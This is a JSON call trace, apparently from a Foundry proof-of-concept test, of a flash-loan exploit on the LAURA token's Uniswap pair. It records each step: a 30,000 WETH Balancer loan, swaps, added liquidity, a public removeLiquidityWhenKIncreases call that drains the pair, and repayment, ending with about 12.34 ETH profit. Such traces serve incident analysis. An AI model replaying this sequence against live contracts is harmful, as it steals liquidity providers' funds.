{
  "logs": {
    "calls": [
      {
        "id": "1858262",
        "contract": "LAURAToken_exp",
        "function": "testPoC",
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "0",
            "contract": "VM",
            "function": "startPrank",
            "args": "attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": [],
            "value": null
          },
          {
            "id": "1815195",
            "contract": "→ new AttackerC0@0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a",
            "function": "constructor",
            "args": "",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": [
              {
                "id": "1343895",
                "contract": "→ new AttackerC1@0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2",
                "function": "constructor",
                "args": "",
                "return_value": "6574 bytes of code",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "24420",
                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                    "function": "approve",
                    "args": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  }
                ]
              },
              {
                "id": "423318",
                "contract": "AttackerC1",
                "function": "attack",
                "args": "",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "2381",
                    "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                    "function": "token0",
                    "args": "",
                    "return_value": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "27315",
                    "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                    "function": "approve",
                    "args": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "24637",
                        "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                        "function": "approve",
                        "args": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "364238",
                    "contract": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
                    "function": "flashLoan",
                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [30000000000000000000000 [3e22]], 0x000000000000000000000000b292678438245ec863f9fea64affcea887144240",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "2534",
                        "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                        "function": "balanceOf",
                        "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
                        "return_value": "32977545748157180924438 [3.297e22]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "2350",
                        "contract": "0xce88686553686DA562CE7Cea497CE749DA109f9F",
                        "function": "getFlashLoanFeePercentage",
                        "args": "",
                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "27962",
                        "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                        "function": "transfer",
                        "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 30000000000000000000000 [3e22]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "312853",
                        "contract": "AttackerC1",
                        "function": "receiveFlashLoan",
                        "args": "[0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [30000000000000000000000 [3e22]], [0], 0x000000000000000000000000b292678438245ec863f9fea64affcea887144240",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "381",
                            "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                            "function": "token0",
                            "args": "",
                            "return_value": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "534",
                            "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                            "function": "balanceOf",
                            "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                            "return_value": "30000000000000000000000 [3e22]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "2534",
                            "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                            "function": "balanceOf",
                            "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                            "return_value": "16466070319256275422 [1.646e19]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "85322",
                            "contract": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
                            "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                            "args": "11526249223479392795400 [1.152e22], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x05641E33Fd15BAf819729dF55500b07b82Eb8E89], AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "6225",
                                "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                "function": "transferFrom",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0xb292678438245Ec863F9FEa64AFfcEA887144240, 11526249223479392795400 [1.152e22]",
                                "return_value": "true",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "2751",
                                "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                "function": "balanceOf",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                "return_value": "0",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "2579",
                                    "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                    "function": "balanceOf",
                                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                    "return_value": "0",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              },
                              {
                                "id": "2504",
                                "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "function": "getReserves",
                                "args": "",
                                "return_value": "6099572126618875527765833 [6.099e24], 16466070319256275422 [1.646e19], 1735736063 [1.735e9]",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "534",
                                "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                "function": "balanceOf",
                                "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "return_value": "11542715293798649070822 [1.154e22]",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "65365",
                                "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "function": "swap",
                                "args": "6090844737683950823905816 [6.09e24], 0, AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0x",
                                "return_value": "Returned",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "34757",
                                    "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                    "function": "transfer",
                                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 6090844737683950823905816 [6.09e24]",
                                    "return_value": "true",
                                    "depth": 7,
                                    "internal_calls": [
                                      {
                                        "id": "34579",
                                        "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                        "function": "transfer",
                                        "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 6090844737683950823905816 [6.09e24]",
                                        "return_value": "true",
                                        "depth": 8,
                                        "internal_calls": []
                                      }
                                    ]
                                  },
                                  {
                                    "id": "751",
                                    "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "8727388934924703860017 [8.727e21]",
                                    "depth": 7,
                                    "internal_calls": [
                                      {
                                        "id": "579",
                                        "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                        "function": "balanceOf",
                                        "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                        "return_value": "8727388934924703860017 [8.727e21]",
                                        "depth": 8,
                                        "internal_calls": []
                                      }
                                    ]
                                  },
                                  {
                                    "id": "534",
                                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "11542715293798649070822 [1.154e22]",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              },
                              {
                                "id": "751",
                                "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                "function": "balanceOf",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                "return_value": "6090844737683950823905816 [6.09e24]",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "579",
                                    "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                    "function": "balanceOf",
                                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                    "return_value": "6090844737683950823905816 [6.09e24]",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              }
                            ]
                          },
                          {
                            "id": "751",
                            "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                            "function": "balanceOf",
                            "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                            "return_value": "6090844737683950823905816 [6.09e24]",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "579",
                                "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                "function": "balanceOf",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                "return_value": "6090844737683950823905816 [6.09e24]",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          },
                          {
                            "id": "73181",
                            "contract": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
                            "function": "addLiquidity",
                            "args": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 6090844737683950823905816 [6.09e24], 11526249223479392795400 [1.152e22], 0, 0, AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                            "return_value": "8714939022036080887320 [8.714e21], 11526249223479392795400 [1.152e22], 9985734664764621968615 [9.985e21]",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "2564",
                                "contract": "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f",
                                "function": "getPair",
                                "args": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                "return_value": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "504",
                                "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "function": "getReserves",
                                "args": "",
                                "return_value": "8727388934924703860017 [8.727e21], 11542715293798649070822 [1.154e22], 1735737743 [1.735e9]",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "11053",
                                "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                "function": "transferFrom",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0xb292678438245Ec863F9FEa64AFfcEA887144240, 8714939022036080887320 [8.714e21]",
                                "return_value": "true",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "10869",
                                    "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                    "function": "transferFrom",
                                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0xb292678438245Ec863F9FEa64AFfcEA887144240, 8714939022036080887320 [8.714e21]",
                                    "return_value": "true",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              },
                              {
                                "id": "3425",
                                "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                "function": "transferFrom",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0xb292678438245Ec863F9FEa64AFfcEA887144240, 11526249223479392795400 [1.152e22]",
                                "return_value": "true",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "46784",
                                "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "function": "mint",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                "return_value": "9985734664764621968615 [9.985e21]",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "751",
                                    "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "17442327956960784747337 [1.744e22]",
                                    "depth": 7,
                                    "internal_calls": [
                                      {
                                        "id": "579",
                                        "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                        "function": "balanceOf",
                                        "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                        "return_value": "17442327956960784747337 [1.744e22]",
                                        "depth": 8,
                                        "internal_calls": []
                                      }
                                    ]
                                  },
                                  {
                                    "id": "534",
                                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "23068964517278041866222 [2.306e22]",
                                    "depth": 7,
                                    "internal_calls": []
                                  },
                                  {
                                    "id": "2314",
                                    "contract": "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f",
                                    "function": "feeTo",
                                    "args": "",
                                    "return_value": "0x0000000000000000000000000000000000000000",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              }
                            ]
                          },
                          {
                            "id": "14325",
                            "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                            "function": "removeLiquidityWhenKIncreases",
                            "args": "",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "14162",
                                "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                "function": "removeLiquidityWhenKIncreases",
                                "args": "",
                                "return_value": "Returned",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "504",
                                    "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "function": "getReserves",
                                    "args": "",
                                    "return_value": "17442327956960784747337 [1.744e22], 23068964517278041866222 [2.306e22], 1735737743 [1.735e9]",
                                    "depth": 7,
                                    "internal_calls": []
                                  },
                                  {
                                    "id": "357",
                                    "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "function": "token1",
                                    "args": "",
                                    "return_value": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                    "depth": 7,
                                    "internal_calls": []
                                  },
                                  {
                                    "id": "7803",
                                    "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "function": "sync",
                                    "args": "",
                                    "return_value": "Returned",
                                    "depth": 7,
                                    "internal_calls": [
                                      {
                                        "id": "751",
                                        "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                        "function": "balanceOf",
                                        "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                        "return_value": "4334828289544710831315 [4.334e21]",
                                        "depth": 8,
                                        "internal_calls": [
                                          {
                                            "id": "579",
                                            "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                            "function": "balanceOf",
                                            "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                            "return_value": "4334828289544710831315 [4.334e21]",
                                            "depth": 9,
                                            "internal_calls": []
                                          }
                                        ]
                                      },
                                      {
                                        "id": "534",
                                        "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                        "function": "balanceOf",
                                        "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                        "return_value": "23068964517278041866222 [2.306e22]",
                                        "depth": 8,
                                        "internal_calls": []
                                      }
                                    ]
                                  }
                                ]
                              }
                            ]
                          },
                          {
                            "id": "24442",
                            "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                            "function": "approve",
                            "args": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "480",
                            "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                            "function": "balanceOf",
                            "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                            "return_value": "9985734664764621968615 [9.985e21]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "53516",
                            "contract": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
                            "function": "removeLiquidity",
                            "args": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 9985734664764621968615 [9.985e21], 0, 0, AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                            "return_value": "2165867096846036817930 [2.165e21], 11526249223479392795399 [1.152e22]",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "25270",
                                "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "function": "transferFrom",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0xb292678438245Ec863F9FEa64AFfcEA887144240, 9985734664764621968615 [9.985e21]",
                                "return_value": "true",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "25889",
                                "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "function": "burn",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                "return_value": "2165867096846036817930 [2.165e21], 11526249223479392795399 [1.152e22]",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "751",
                                    "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "4334828289544710831315 [4.334e21]",
                                    "depth": 7,
                                    "internal_calls": [
                                      {
                                        "id": "579",
                                        "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                        "function": "balanceOf",
                                        "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                        "return_value": "4334828289544710831315 [4.334e21]",
                                        "depth": 8,
                                        "internal_calls": []
                                      }
                                    ]
                                  },
                                  {
                                    "id": "534",
                                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "23068964517278041866222 [2.306e22]",
                                    "depth": 7,
                                    "internal_calls": []
                                  },
                                  {
                                    "id": "314",
                                    "contract": "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f",
                                    "function": "feeTo",
                                    "args": "",
                                    "return_value": "0x0000000000000000000000000000000000000000",
                                    "depth": 7,
                                    "internal_calls": []
                                  },
                                  {
                                    "id": "4057",
                                    "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                    "function": "transfer",
                                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 2165867096846036817930 [2.165e21]",
                                    "return_value": "true",
                                    "depth": 7,
                                    "internal_calls": [
                                      {
                                        "id": "3879",
                                        "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                        "function": "transfer",
                                        "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 2165867096846036817930 [2.165e21]",
                                        "return_value": "true",
                                        "depth": 8,
                                        "internal_calls": []
                                      }
                                    ]
                                  },
                                  {
                                    "id": "3262",
                                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                    "function": "transfer",
                                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 11526249223479392795399 [1.152e22]",
                                    "return_value": "true",
                                    "depth": 7,
                                    "internal_calls": []
                                  },
                                  {
                                    "id": "751",
                                    "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "2168961192698674013385 [2.168e21]",
                                    "depth": 7,
                                    "internal_calls": [
                                      {
                                        "id": "579",
                                        "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                        "function": "balanceOf",
                                        "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                        "return_value": "2168961192698674013385 [2.168e21]",
                                        "depth": 8,
                                        "internal_calls": []
                                      }
                                    ]
                                  },
                                  {
                                    "id": "534",
                                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "11542715293798649070823 [1.154e22]",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              }
                            ]
                          },
                          {
                            "id": "751",
                            "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                            "function": "balanceOf",
                            "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                            "return_value": "6084295665758760779836426 [6.084e24]",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "579",
                                "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                "function": "balanceOf",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                "return_value": "6084295665758760779836426 [6.084e24]",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          },
                          {
                            "id": "33172",
                            "contract": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
                            "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                            "args": "6084295665758760779836426 [6.084e24], 0, [0x05641E33Fd15BAf819729dF55500b07b82Eb8E89, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                            "return_value": "Returned",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "7053",
                                "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                "function": "transferFrom",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0xb292678438245Ec863F9FEa64AFfcEA887144240, 6084295665758760779836426 [6.084e24]",
                                "return_value": "true",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "6869",
                                    "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                    "function": "transferFrom",
                                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0xb292678438245Ec863F9FEa64AFfcEA887144240, 6084295665758760779836426 [6.084e24]",
                                    "return_value": "true",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              },
                              {
                                "id": "534",
                                "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                "function": "balanceOf",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                "return_value": "18473750776520607204599 [1.847e22]",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "504",
                                "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "function": "getReserves",
                                "args": "",
                                "return_value": "2168961192698674013385 [2.168e21], 11542715293798649070823 [1.154e22], 1735737743 [1.735e9]",
                                "depth": 6,
                                "internal_calls": []
                              },
                              {
                                "id": "751",
                                "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                "function": "balanceOf",
                                "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "return_value": "6086464626951459453849811 [6.086e24]",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "579",
                                    "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "6086464626951459453849811 [6.086e24]",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              },
                              {
                                "id": "16654",
                                "contract": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                "function": "swap",
                                "args": "0, 11538589580556677100607 [1.153e22], AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0x",
                                "return_value": "Returned",
                                "depth": 6,
                                "internal_calls": [
                                  {
                                    "id": "3262",
                                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                    "function": "transfer",
                                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 11538589580556677100607 [1.153e22]",
                                    "return_value": "true",
                                    "depth": 7,
                                    "internal_calls": []
                                  },
                                  {
                                    "id": "751",
                                    "contract": "0x05641E33Fd15BAf819729dF55500b07b82Eb8E89",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "6086464626951459453849811 [6.086e24]",
                                    "depth": 7,
                                    "internal_calls": [
                                      {
                                        "id": "579",
                                        "contract": "0x539D54074E052ae82de4936Ae6BB213AB773559E",
                                        "function": "balanceOf",
                                        "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                        "return_value": "6086464626951459453849811 [6.086e24]",
                                        "depth": 8,
                                        "internal_calls": []
                                      }
                                    ]
                                  },
                                  {
                                    "id": "534",
                                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                    "function": "balanceOf",
                                    "args": "0xb292678438245Ec863F9FEa64AFfcEA887144240",
                                    "return_value": "4125713241971970216 [4.125e18]",
                                    "depth": 7,
                                    "internal_calls": []
                                  }
                                ]
                              },
                              {
                                "id": "534",
                                "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                                "function": "balanceOf",
                                "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                                "return_value": "30012340357077284305206 [3.001e22]",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          },
                          {
                            "id": "3262",
                            "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                            "function": "transfer",
                            "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8, 30000000000000000000000 [3e22]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "534",
                        "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                        "function": "balanceOf",
                        "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
                        "return_value": "32977545748157180924438 [3.297e22]",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "534",
                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                    "function": "balanceOf",
                    "args": "AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]",
                    "return_value": "12340357077284305206 [1.234e19]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "9195",
                    "contract": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                    "function": "withdraw",
                    "args": "12340357077284305206 [1.234e19]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  }
                ]
              }
            ],
            "value": null
          }
        ],
        "value": null
      },
      {
        "id": "0",
        "contract": "console",
        "function": "log",
        "args": "\"Final balance in ETH :\", 12340357077284305206 [1.234e19]",
        "return_value": "Returned",
        "depth": 1,
        "internal_calls": [],
        "value": null
      }
    ]
  }
}